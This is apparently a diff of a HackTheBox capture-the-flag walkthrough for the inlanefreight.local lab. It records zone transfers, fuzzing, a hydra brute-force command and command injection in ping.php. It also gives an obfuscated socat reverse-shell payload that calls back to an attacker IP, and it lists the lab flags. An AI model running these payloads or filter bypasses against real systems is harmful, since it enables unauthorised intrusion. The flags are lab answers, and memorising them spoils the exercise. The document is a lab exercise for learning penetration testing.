@@ -16,7 +16,7 @@ The first flag was found using the following command:
 dig axfr inlanefreight.local @10.129.229.147
 ```
 
-### Output:
+Output:
 ```
 ; <<>> DiG 9.18.30-0ubuntu0.24.04.2-Ubuntu <<>> axfr inlanefreight.local @10.129.229.147
 ;; global options: +cmd
@@ -38,6 +38,13 @@ vpn.inlanefreight.local. 86400 IN A 127.0.0.1
 ---
 
 (note that the target ip address can change because the target machine will shut down after a period of time on HackTheBox and will need to be manually restarted, randomly changing the ip address)
+
+There also may be some subdomains that are not included in the zone transfer. We then additionally fuzz for subdomains using ffuf:
+```
+ffuf -w SecLists/Discovery/DNS/namelist.txt:FUZZ -u http://10.129.229.147 -H 'Host:FUZZ.inlanefreight.local'
+```
+We additionally get monitoring.inlanefreight.local as a subdomain.
+
 ## Second Flag
 
 Found using an FTP anonymous login:
@@ -49,15 +56,10 @@ get flag.txt
 
 ---
 
-## Parameter Fuzzing
-
 I fuzzed for parameters with ffuf, I got this as result from the following command:
 ```
 ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://careers.inlanefreight.local:80/FUZZ?id=1 -fs (common size)
 ```
-
-
-### Results:
 ```
 apply        [Status: 200, Size: 16408, Words: 5625, Lines: 265, Duration: 84ms]
 login        [Status: 200, Size: 9459, Words: 2752, Lines: 187, Duration: 159ms]
@@ -153,15 +155,15 @@ When we paste this command into the text prompt, we get the output "/etc/ not ac
 </script>
 ```
 
-This works, and gets us our ==7th flag from tracking.inlanefreight.local: HTB{49f0bad299687c62334182178bfd75d8}==
+This works, and gets us our ==7th flag from tracking.inlanefreight.local: HTB{49f0bad299687c62334182178bfd75d8}
 
-### 8th Flag:
+### Eighth Flag:
 
 Next target will be gitlab.inlanefreight.local.
 
-We see that it brings us to a gitlab page where it prompts us to login/register. We can register a test account and login. We don't see anything interesting at first, but with some browsing we see that if we go to Menu -> Groups -> Explore Groups, we come across a GitLab instance with the ==8th flag: HTB{32596e8376077c3ef8d5cf52f15279ba}==
+We see that it brings us to a gitlab page where it prompts us to login/register. We can register a test account and login. We don't see anything interesting at first, but with some browsing we see that if we go to Menu -> Groups -> Explore Groups, we come across a GitLab instance with the 8th flag: HTB{32596e8376077c3ef8d5cf52f15279ba}
 
-### 9th Flag:
+### Ninth Flag:
 
 We also have access to a website repository called shopdev2.inlanefreight.local. Upon visiting we see fields for admin username and password. Surprisingly, it has the default credentials username "admin" and password "admin." When visiting "my cart" at the url shopdev2.inlanefreight.local/cart.php, we see that there is backend processing since we get an HTTP response back from BurpSuite after we press complete purchase:
 ```
@@ -221,3 +223,63 @@ User: HTB{dbca4dc5d99cdb3311404ea74921553c}
  <br>Checkout Process not Implemented
  ```
 ### Tenth Flag:
+We then move on to the next subdomain monitoring.inlanefreight.local. The page appears to be a simple username and password portal with the login button. One look at BurpSuite and we see that the website returns the variables username= and password=. We can try using hydra to brute force this login form's admin account with the command: 
+```
+hydra -L SecLists/Usernames/Names/names.txt -P SecLists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=^USER^&password=^PASS^:F=Invalid Credentials"
+```
+We then get admin as the username and 12qwaszx as the password after around 15 minutes. 
+
+Once we login, we see that it takes us to a limited linux GUI. With the help command, we are able to see all the commands we can run. We notice that there is a command called "connection-test" which throws a "success" after you run it. We try to capture this processing through BurpSuite. 
+```
+GET /ping.php?ip=127.0.0.1 HTTP/1.1
+Host: monitoring.inlanefreight.local
+```
+From here we see that it calls the ping.php file with the parameter ip which most likely pings the ip. Let's try to add an AND statement with urlencoded characters like &&,;, and the newline character. The newline character works if we substitute the HTTP header with 
+```
+GET /ping.php?ip=127.0.0.1%0als HTTP/1.1
+Host: monitoring.inlanefreight.local
+```
+
+If we replace the original GET request with above, we get the following result in Burp repeater:
+```
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.038/0.038/0.038/0.000 ms
+00112233_flag.txt
+css
+img
+index.php
+js
+login.php
+ping.php
+```
+
+Now I try to cat the flag.txt file, however it is giving me invalid command. I assume that the space characters are being filtered on the backend, so we try %09 tab character as an alternative. It works, and we get the 10th flag: 
+HTB{bdd8a93aff53fd63a0a14de4eba4cbc1}
+
+### Eleventh Flag:
+
+Since we have command execution, we can try using a reverse shell. I had a bit of trouble getting a reverse shell to work. I got a tip from Yerald Leiva's video where he used a socat shell. I tried the following url encoded command on BurpSuite:
+```
+127.0.0.1%0a's'o'c'a't'%09TCP%3A10.10.16.41%3A4443%09EXEC%3A%2Fb'i'n%2Fbash
+```
+This did not seem to work. I tested similar commands a couple of times and realized that the backend may be blocking %2F or the "/" command to prevent calling on directories. I instead used the obfuscation method "${PATH:0:1}" which is equivalent to "/".
+
+Now the command becomes
+```
+127.0.0.1%0a's'o'c'a't'%09TCP%3A10.10.16.41%3A4443%09EXEC%3A${PATH:0:1}b'i'n${PATH:0:1}bash
+```
+and we successfully get a basic reverse shell connection on our attack box. 
+
+Now we try to upgrade our socat shell to a fully interactive shell. We do this by using another netcat listener on the terminal with the command
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.41:4442
+```
+After we get the fully interactive reverse shell, we see that we are the "webdev" user on a machine called "dmz01." We cycle through the user profiles in the /home directory and get our 11th flag from the "srvadm" user's home directory:
+```
+b447c27a00e3a348881b0030177000cd
+```
+### Twelveth Flag:
